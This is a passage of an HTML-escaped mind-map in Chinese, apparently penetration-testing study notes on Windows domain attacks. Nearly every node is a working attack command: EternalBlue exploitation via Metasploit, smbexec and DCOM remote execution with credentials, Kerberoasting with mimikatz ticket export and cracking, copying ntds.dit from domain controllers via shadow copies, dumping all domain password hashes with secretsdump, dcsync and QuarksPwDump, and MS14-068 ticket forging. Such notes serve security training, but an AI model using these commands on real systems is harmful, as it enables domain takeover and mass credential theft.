  &lt;node TEXT=&quot;永恒之蓝&quot; ID=&quot;3e31736beb7c8c17c&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;metasploit&quot; ID=&quot;831736beb8d7c0be&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;use auxiliary/scanner/smb/smb_ms17_010 检测&quot; ID=&quot;3b71736bebd5e6175&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;use exploit/windows/smb/ms17_010_eternalblue 利用&quot; ID=&quot;1c01736bec5634071&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;smbexec的使用&quot; ID=&quot;a41736bed07bc063&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;C++版本smbexec[下载地址：https://github.com/sunorr/smbexec]&quot; ID=&quot;18b1736bed1e7c16e&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;将execserver.exe上传到目标系统c:\windows目录下，解除UAC对命令执行的限制，执行以下命令&quot; ID=&quot;3d61736bee0e0d07b&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;net user \\192.168.1.1 &amp;quot;admin123&amp;quot; /user:pentest.com\administrator&quot; ID=&quot;3e01736bef2bdd0bf&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;copy execserver.exe \\192.168.1.1\c$\windows\&quot; ID=&quot;3731736bef90e5199&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;在客户端执行命令&quot; ID=&quot;2ef1736befed9d029&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;test.exe 192.168.1.1 administrator admin123 whoami c$&quot; ID=&quot;2411736bf048ed09d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;impacket工具包中的smbexec.py&quot; ID=&quot;821736bf0ae1c186&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;smbexec.py pentest.com/administrator:admin123\@192.168.1.1&quot; ID=&quot;33d1736bf0e5cc07c&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Linux跨Windows远程命令执行[下载地址：https://github.com/brav0hax/smbexec]&quot; ID=&quot;1471736bf343750b3&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;DCOM在远程系统中的使用&quot; ID=&quot;1e81736bf46a6d14b&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;通过本地DCOM执行命令&quot; ID=&quot;2f91736bf49365067&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;获取DCOM程序列表&quot; ID=&quot;1841736bf55cdd0f9&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Get-CimInstance Win32_DCOMApplication[powershell 3.0+]&quot; ID=&quot;771736bf4b05d0ec&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;Get-WMIObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication&quot; ID=&quot;18c1736bf57ee4144&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;使用DCOM执行任意命令&quot; ID=&quot;e81736bf5e9fc115&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;$com=[activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;MMC20.Application&amp;quot;,&amp;quot;127.0.0.1&amp;quot;))&quot; ID=&quot;1c01736bf60d7c06d&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;$com.Document.ActiveView.ExecuteShellCommand(&amp;apos;cmd.exe&amp;apos;,$null,&amp;apos;/c calc.exe&amp;apos;,&amp;quot;Minimzed&amp;quot;)&quot; ID=&quot;3121736bf8314d006&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;使用DCOM在远程机器上执行命令&quot; ID=&quot;3421736bf9a87416&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;建立 IPC$连接：net user \\192.168.1.1 &amp;quot;admin123&amp;quot; /user:pentest.com\administrator&quot; ID=&quot;3651736bfa09ec0b2&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;执行命令&quot; ID=&quot;3e71736bfaae4405c&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;调用MMC20.Application远程执行命令&quot; ID=&quot;1111736bfac3c300d&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;$com=[activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;MMC20.Application&amp;quot;,&amp;quot;192.168.1.1&amp;quot;))&quot; ID=&quot;391736bfb043c0f4&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;$com.Document.ActiveView.ExecuteShellCommand(&amp;apos;cmd.exe&amp;apos;,$null,&amp;apos;/c calc.exe&amp;apos;,&amp;quot;Minimzed&amp;quot;)&quot; ID=&quot;13c1736bfb16651291&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;调用9BA05972-F6A8-11CF-A442-00A0C90A8F39远程执行命令&quot; ID=&quot;1e81736bfcf2cc065&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;$com=[activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&amp;quot;,&amp;quot;192.168.1.1&amp;quot;))&quot; ID=&quot;3541736bfcf3d40371&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;$com.Document.ActiveView.ExecuteShellCommand(&amp;apos;cmd.exe&amp;apos;,$null,&amp;apos;/c calc.exe&amp;apos;,&amp;quot;Minimzed&amp;quot;)&quot; ID=&quot;29f1736bfcf3d40b72&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;SPN在域环境中的应用&quot; ID=&quot;3a21736bfd613c08f&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;SPN扫描&quot; ID=&quot;3771736bfd802c0cc&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;PowerShell-AD-Recon工具包[下载地址：https://github.com/PyroTek3/PowerShell-AD-Recon]&quot; ID=&quot;3da1736bfe9e6701c&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;在域中任一机器 上，以域用户身份运行一个powershell，导入脚本文件并执行&quot; ID=&quot;2f01736bffe09c151&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;扫描所有MSSQL服务&quot; ID=&quot;ab1736c0198c5057&quot; STYLE=&quot;fork&quot;&gt;
            &lt;node TEXT=&quot;Import-Module .\Discover-PSMSSQLServers.ps1&quot; ID=&quot;1541736c02811408b&quot; STYLE=&quot;fork&quot;/&gt;
            &lt;node TEXT=&quot;Discover-PSMSSQLServers&quot; ID=&quot;1fb1736c01074504f&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;/node&gt;
          &lt;node TEXT=&quot;扫描所用SPN信息&quot; ID=&quot;121736c015fb30de&quot; STYLE=&quot;fork&quot;&gt;
            &lt;node TEXT=&quot;Import-Module .\Discover-PSInterestingServices.ps1&quot; ID=&quot;1b51736c028ddc05a&quot; STYLE=&quot;fork&quot;/&gt;
            &lt;node TEXT=&quot;Discover-PSInterestingServices&quot; ID=&quot;3011736c01dd3d16d&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;/node&gt;
        &lt;/node&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;Windows自带命令&quot; ID=&quot;1ef1736c02b82d00b&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;setspn -T domain -q &amp;quot;*/*&amp;quot;&quot; ID=&quot;2341736c02d57c00c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Kerberoast攻击&quot; ID=&quot;3781736c03266b151&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;请求SPN票据，打开powershell&quot; ID=&quot;3881736c03520c024&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Add-Type -AssemblyName System.IdentityModel Net-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &amp;quot;MSSQLSvc/computer1.pentest.com&amp;quot;&quot; ID=&quot;2741736c04c44d12b&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;导出票据，mimikatz&quot; ID=&quot;ae1736c05d0d40d8&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;kerberos::list /export&quot; ID=&quot;1111736c05fd9408f&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;使用Kerberoast脚本离线 破解票据[下载地址：https://github.com/nidem/kerberoast ]&quot; ID=&quot;2701736c06585d034&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;python tgsrepcrack.py wordlist.txt mssql.kirbi&quot; ID=&quot;91736c06a254062&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;Exchange邮件服务器安全&quot; ID=&quot;2ed1736c07a84c121&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;远程访问接口&quot; ID=&quot;3051736c07c2f401&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;owa   web邮箱&quot; ID=&quot;13e1736c08845d11a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;eac     exchange管理中心即WEB的控制台&quot; ID=&quot;1ce1736c08a07c04b&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Exchange服务发现&quot; ID=&quot;1541736c08ee8c09&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;基于端口扫描&quot; ID=&quot;32b1736c09dddc0f8&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;SPN查询 &quot; ID=&quot;681736c09f3a4019&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;exchangeRFR\exchangeAB\exchangeMDB\SMTP\sMTPsVC等都是exchange注册的服务&quot; ID=&quot;3181736c0ab0ac184&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;基本操作&quot; ID=&quot;2581736c0b96b3197&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;查看邮件数据库&quot; ID=&quot;2711736c0ba5b4195&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;GetmailboxDatabase -server &amp;quot;Exchange1&amp;quot;&quot; ID=&quot;2d01736c0d383c0f&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;powershell环境中默认没有这条命令，需要执行add-pssnapin microsoft.exchange*添加命令&quot; ID=&quot;36f1736c0d878c0fe&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;指定数据库，查询详细信息&quot; ID=&quot;2331736c0e055415&quot; STYLE=&quot;fork&quot;&gt;
            &lt;node TEXT=&quot;GetmailboxDatabase -Identity &amp;apos;Mailbox Database xxxxx&amp;apos;|Format-List Name,EdbFilePath,LogFolderPath [其中Mailbox Database xxxxx为获取到的数据库名]&quot; ID=&quot;3be1736c0ec88408d&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;/node&gt;
        &lt;/node&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;获取现有用户的邮件地址&quot; ID=&quot;3e41736c0fe9e4146&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Get-Mailbox | format-Table Name,WindowsEmailAddress&quot; ID=&quot;1001736c100d9414&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;查看指定用户的邮箱 使用信息&quot; ID=&quot;3bb1736c107f54035&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Get-mailboxstatistics -Identity administrator | select DisplayName,itemcount,TotalItemSize,lastlogonTime&quot; ID=&quot;9f1736c10aa1c10c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;获取用户邮箱 中的邮件数量&quot; ID=&quot;3b51736c11a194112&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Get-mailbox -ResultSize unlimited|get-mailboxStatistics|sort-object totalitemsize -descend&quot; ID=&quot;1351736c11cb1c07e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;导出邮件[不搞APT，这一节没啥用]&quot; ID=&quot;2401736c1842fc145&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
&lt;/node&gt;
&lt;node TEXT=&quot;六、域控制器安全&quot; ID=&quot;e31735a6aca7a067&quot; STYLE=&quot;bubble&quot; POSITION=&quot;left&quot;&gt;
  &lt;node TEXT=&quot;使用卷影拷贝提取ntds.dit&quot; ID=&quot;81736c4ed67a0ba&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;通过ntdsutil.exe提取ntds.dit&quot; ID=&quot;191736c3072ac055&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;创建快照：ntdsutil snapshot &amp;quot;activate instance ntds&amp;quot; create quit quit&quot; ID=&quot;2bd1736c30efa40f1&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;加载快照：ntdsutil snapshot &amp;quot;mount &#123;GUID&#125;&amp;quot; quit quit  //GUID为上一步生成&quot; ID=&quot;3a01736c31da7c133&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;复制ntds.dit：copy C:\$SNAP_201802270645_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit  //C:\$SNAP_201802270645_VOLUMEC$为上一步的挂载路径&quot; ID=&quot;1481736c3442bc17b&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;卸载快照：ntdsutil snapshot &amp;quot;unmount &#123;GUID&#125;&amp;quot; quit quit&quot; ID=&quot;cc1736c355c3c026&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;查询快照：ntdsutil snapshot &amp;quot;List All&amp;quot; quit quit //卸载快照后，此时应为空&quot; ID=&quot;12b1736c35c15311c&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;利用vssadmin提取ntds.dit&quot; ID=&quot;33f1736c3679fb0d9&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;创建C盘的卷影拷贝：vssadmin create shadow /for=c:&quot; ID=&quot;ce1736c369dc3071&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;复制ntds.dit：copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit c:\ntds.dit   //其中\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12为上一步生成&quot; ID=&quot;1fd1736c375bbc08a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;删除快照：vssadmin delete shadows /for=c: /quiet&quot; ID=&quot;3b71736c38cb5c161&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;利用vssown.vbs脚本提取ntds.dit&quot; ID=&quot;3bb1736c39161c0b3&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;启动卷影拷贝服务：cscript vssown.vbs /start&quot; ID=&quot;691736c3949a3068&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;创建C盘的卷影拷贝：cscript vssown.vbs /create C&quot; ID=&quot;2601736c3ad67406d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;列出当前的卷影拷由：cscript vssown.vbs /list&quot; ID=&quot;e01736c3b55a4146&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;复制ntds.dit：copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit c:\ntds.dit   //其中 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12为上一步中的Device Object项内容&quot; ID=&quot;1f31736c3c1e1b01b&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;删除卷影拷贝：cscript vssown.vbs /delete &#123;GUID&#125;  //其中的GUID为第三步中的ID项内容&quot; ID=&quot;3a1736c3cf104099&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;使用ntdsutil的IFM创建卷影拷贝&quot; ID=&quot;1511736c3db5cc13c&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;在域控服务器上以管理员权限运行以下命令，即会自动复制ntds.dit到c:\test\active directory\文件夹下&quot; ID=&quot;3981736c3e0a5b163&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;ntdsutil &amp;quot;ac i ntds&amp;quot; &amp;quot;ifm&amp;quot; &amp;quot;create full c:/test&amp;quot; q q&quot; ID=&quot;3a41736c42c8eb081&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;将ntds.dit文件拷走后删除test文件夹：rmdir /s /q test&quot; ID=&quot;6e1736c43e8ba194&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Nishang中的Copy-VSS.ps1脚本，可以将SAM\SYSTEM\ntds.dit复制到当前目录&quot; ID=&quot;571736c45baf415c&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Import-Modult .\Copy-VSS.ps1&quot; ID=&quot;1241736c464f2c0b1&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;Copy-VSS&quot; ID=&quot;d01736c467afb108&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;使用diskshadow导出ntds.dit&quot; ID=&quot;2061736c46d393095&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;执行命令&quot; ID=&quot;d1736c47107b0bc&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;将exec c:\windows\system32\calc.exe写入test.txt中，执行diskshadow.exe /s test.txt即会执行文本中的命令&quot; ID=&quot;3d61736c48ceb3042&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;导出ntds.dit&quot; ID=&quot;3831736c4a979b137&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;将以下命令写入文本文件c:\command.txt&quot; ID=&quot;551736c4ab274111&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;set context persistent nowriters&quot; ID=&quot;2181736c4b2cec137&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;add volume c: alias someAlias&quot; ID=&quot;1a1736c4b53a30b4&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;create&quot; ID=&quot;1ba1736c4b84fb179&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;expose %someAlias% k:&quot; ID=&quot;3c91736c4b8ff307f&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;exec &amp;quot;cmd.exe&amp;quot; /c copy k:\windows\ntds\ntds.dit c:\ntds.dit&quot; ID=&quot;421736c4bc81d0a2&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;delete shadows all&quot; ID=&quot;2cb1736c4c546b0ae&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;listshadows all&quot; ID=&quot;2fd1736c4c664213b&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;reset&quot; ID=&quot;2ec1736c4c7b6c02f&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;exit&quot; ID=&quot;1fb1736c4c84a409e&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;执行命令diskshadow.exe /s c:\command.txt时必须将shell路径切换至c:\windows\system32目录下&quot; ID=&quot;701736c4c8a8b02e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;导出ntds.dit文件后需要将system转储 [system.hive中存放着ntds.dit的密钥]&quot; ID=&quot;1991736c4d77a30b1&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;reg save hklm\system c:\windows\temp\system.hive&quot; ID=&quot;bf1736c4e1e7b186&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;导出ntds.dit中的hash&quot; ID=&quot;461736c4f28ea05b&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;使用esedbexport恢复hash[下载地址：https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz]&quot; ID=&quot;2761736c4f55f403f&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;提取表：esedbexport -m tables ntds.dit [两个重要的表为：datatable以及link_table，他们都会被存放在./ntds.dit.export/文件夹中]&quot; ID=&quot;5c1736c4fa203033&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;ntdsxtract提取域中信息：dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive systemhive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt [下载地址：https://github.com/csababarta/ntdsxtract]&quot; ID=&quot;3de1736c546da404f&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;提取计算机信息及其它信息：dscomputers.py ntds.dit.export/datatable.3 computer_output --csvoutfile all_computers.csv&quot; ID=&quot;14b1736c56c72b08c&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;使用impacket工具包导出hash&quot; ID=&quot;2931736c577904147&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL &quot; ID=&quot;871736c57aa13095&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;impacket还可以通过帐户、哈希进行身份验证从远程域控中读取ntds.dit并转储&quot; ID=&quot;3be1736c5a721a0a9&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc$@10.0.0.1 &quot; ID=&quot;1c81736c5b36f2009&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;在Windows下解析ntds.dit并导出hash&quot; ID=&quot;1511736c5b7d9a12d&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;ntdsdumpex.exe -d ntds.dit -s system&quot; ID=&quot;3041736c5bcb4a0c6&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;利用dcsync获取域hash&quot; ID=&quot;ef1736c5c8e9316d&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;使用mimikatz转储域hash&quot; ID=&quot;1821736c5cb883086&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;lsadump::dcsync /domain:pentest.com /all /csv [需先执行privilege::debug命令，并加上log]&quot; ID=&quot;21736c5d190b111&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;使用Invoke-DCSync.ps1获取域hash&quot; ID=&quot;1e91736c5e1a4b195&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;powershell.exe -exec bypass -command &amp;quot;&amp;amp; &#123;Import-Module .\invoke-dcsync.ps1;invoke-dcsync -PWDumpFormat&#125;&amp;quot;&quot; ID=&quot;1ea1736c5e8033016&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;使用Metasploit获取域hash&quot; ID=&quot;1621736c5f8c2b0b6&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;使用psexec_ntdsgrab 模块&quot; ID=&quot;3ca1736c61ac0b0ca&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;use auxiliary/admin/smb/psexec_ntdsgrab   配置rhost\smbdomain\smbuser\smbpass&quot; ID=&quot;1971736c5fbb3315&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;基于meterpreter会话&quot; ID=&quot;71736c617433143&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;use windows/gather/credentials/domain_hashdump 配置meterpreter会话ID&quot; ID=&quot;681736c619cda167&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;使用vshadow.exe和quarkspwdump.exe导出域hash&quot; ID=&quot;33c1736c628be30f5&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;将三个工具传到目标服务器同一目录下：vshadow.exe + ShadowCopy.bat + QuarksPwDump.exe&quot; ID=&quot;32e1736c635cbb0bc&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;以管理员权限运行ShadowCopy.bat脚本,之后提取的ntds.dit会被复制到当前目录,利用esentutl工具修复ntds.dit文件&quot; ID=&quot;35c1736c66e47b03a&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;esentutl /p /o ntds.dit&quot; ID=&quot;1ef1736c66ecc3197&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;利用QuarksPwDump 读取修复后的ntds.dit文件,导出域内所有账户hash&quot; ID=&quot;2211736c66ff73015&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;reg save hklm\system system.hive&quot; ID=&quot;a01736c672ee215e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive -o c:\res.txt&quot; ID=&quot;3bb1736c676b3b12&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;Kerberos域用户提权[MS14-068]&quot; ID=&quot;1341736f30433a02c&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;pyKEK工具包[下载地址：https://technet.microsoft.com/library/security/ms14-068 ]&quot; ID=&quot;26e1736f3066430ec&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;查看当前域用户的SID：whoami /all&quot; ID=&quot;2881736f318a710e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;生成高权限票据：python ms14-068.py -u 用户名@域名 -s 域用户SID -d 域控IP -p 域用户密码【python ms-14-068.py -u user1@pentest.com -s S-1-5-21-31112629480-1751665795-4063538595-1104 -d 172.16.86.130 -p Aa123456】&quot; ID=&quot;2fa1736f52c4e90a4&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;清除内存中的所有票据：打开mimikatz，kerberos::purge 当看到Ticket purge for current session is OK时表示清除成功&quot; ID=&quot;29d1736f5c2ed2041&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;将高权限票据注入内存：打开mimikatz,输入kerberos::ptc &amp;quot;TGT_user1@pentest.com.cache&amp;quot; 看到Injecting ticket : OK表示 注入成功&quot; ID=&quot;1611736f5e55ca0e8&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;验证权限：dir \\dc\c$ [net user \\dc\ipc$][使用IP连接可能会失败，故使用计算机名]&quot; ID=&quot;451736f73ed4f11e&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;goldenPac.py&quot; ID=&quot;1dc1736f74b9f90c&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;python goldenPac.py 域名/域用户名:域用户密码@域控服务器&quot; ID=&quot;3691736f74d019184&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;kali中需要安装依赖：apt-get install -y krb5-user&quot; ID=&quot;1161736f76d44215c&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Metasploit&quot; ID=&quot;11c1736f77ce48172&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;use auxiliary/admin/kerberos/ms14_068_kerberos_checksum  配置域名、域用户/密码/SID 执行exploit后，会生成bin文件&quot; ID=&quot;ae1736f77dbe0066&quot; STYLE=&quot;fork&quot;/&gt;
